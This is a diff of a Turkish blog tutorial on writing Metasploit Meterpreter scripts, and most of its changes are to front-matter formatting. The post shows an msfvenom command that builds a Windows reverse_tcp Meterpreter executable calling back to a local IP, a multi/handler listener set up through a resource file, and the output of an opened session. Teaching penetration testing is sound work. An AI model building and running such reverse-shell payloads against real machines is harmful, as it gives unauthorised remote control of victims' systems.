@@ -1,29 +1,24 @@
 ---
 draft: false
-
-title:  'MSF Meterpreter Script Yazma'
-date: '2017-06-14T13:47:00+03:00'
+title:  MSF Meterpreter Script Yazma
+linkTitle: MSF Meterpreter Script Yazma
+translationKey: msf-meterpreter-script-writing
+weight: 370
+date: 2017-06-14T13:47:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-
-description:  "Öncelile, yeni bir script yazarken dikkat edilmesi gereken bir takım kuralları görelim. 
-Tüm Windows sürümleri aynı değildir. 
-Bazı Windows sürümleri, güvenlik tedbirleri barındırırlar. 
-Windows Scriptleri, sürüme bağlı olarak farklı davranış gösterirler. 
-Script yazarken Windows sürümüne özel davranmanız gerekebilir." 
- 
-url:  /tr/msf-meterpreter-script-yazma/
- 
+description:  MSF Meterpreter Script Yazma ile ilgili detaylı bilgileri bu yazıda bulabilirsiniz.
+url:  /tr/msf-meterpreter-script-yazma/ 
 featured_image: /images/metasploit.jpg
 categories:
-    - 'Metasploit Framework'
+    - Metasploit Framework
 tags:
     - cybersecurity
-    - 'metasploit framework'
+    - metasploit framework
 ---
 ## Script Yazma
 
 Öncelile, yeni bir script yazarken dikkat edilmesi gereken bir takım kuralları görelim.
-* 
+  
 * Tüm Windows sürümleri aynı değildir.
 
 * Bazı Windows sürümleri, güvenlik tedbirleri barındırırlar.
@@ -31,9 +26,11 @@ tags:
 * Windows Scriptleri, sürüme bağlı olarak farklı davranış gösterirler.
 
 * Script yazarken Windows sürümüne özel davranmanız gerekebilir.
+
 Yukarıda belirtilen kuralları göz önünde bulundurarak, hedefe özel script yazmak gerekmektedir. Bu durumda yazacağımız script doğru çalışabilir.
 
 Şimdi, aşağıdaki komut ile çalıştırılabilir bir .exe dosyası oluşturalım. Bu program, hedef sistemde çalışacak ve yerel bilgisayarımıza reverse bağlantı açacaktır.
+
 ```bash
 root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
 Found 10 compatible encoders
@@ -45,6 +42,7 @@ Saved as: Meterpreter.exe
 ```
 
 Gerekli .exe dosyamız oluşturuldu. Bu dosya hedef windows işletim sistemi içinde çalışacak ve yerel bilgisayara iletişim sağlayacaktır. O zaman bizim yerel bilgisayarda dinleyici oluşturmamız gerekmektedir. Dinleyicimizi oluşturalım.
+
 ```bash
 root@kali:~# touch meterpreter.rc
 root@kali:~# echo use exploit/multi/handler > meterpreter.rc
@@ -65,6 +63,7 @@ Dikkat ederseniz komutlarla, multi handler modülünü dinleyici olarak ayarlad�
 Yeni yazdığımız scriptleri `/usr/share/metasploit-framework/scripts/meterpreter` klasörüne kayıt edersek, kolayca kullanabiliriz.
 
 Şimdi yapmamız gereken, `msfconsole` programını yeni oluşturduğumuz `meterpreter.rc` dosyasını kaynak göstererek başlatmak.
+
 ```bash
 root@kali:~# msfconsole -r meterpreter.rc
 
@@ -86,6 +85,7 @@ resource> exploit -j -z
 ```
 
 Yukarıda gördüğünüz gibi Metasploit Framework dinleme yaparak başlamıştır. Artık, oluşturduğumuz .exe dosyasını Windows içerisinde çalıştırdığımızda, oturum aktif hale gelecektir.
+
 ```bash
 > Sending stage (718336 bytes)
 > Meterpreter session 1 opened (192.168.1.158:4444 -> 192.168.1.104:1043)
@@ -93,4 +93,5 @@ Yukarıda gördüğünüz gibi Metasploit Framework dinleme yaparak başlamışt
 msf exploit(handler) > sessions -i 1
 > Starting interaction with 1...
 
-meterpreter >```
+meterpreter >
+```
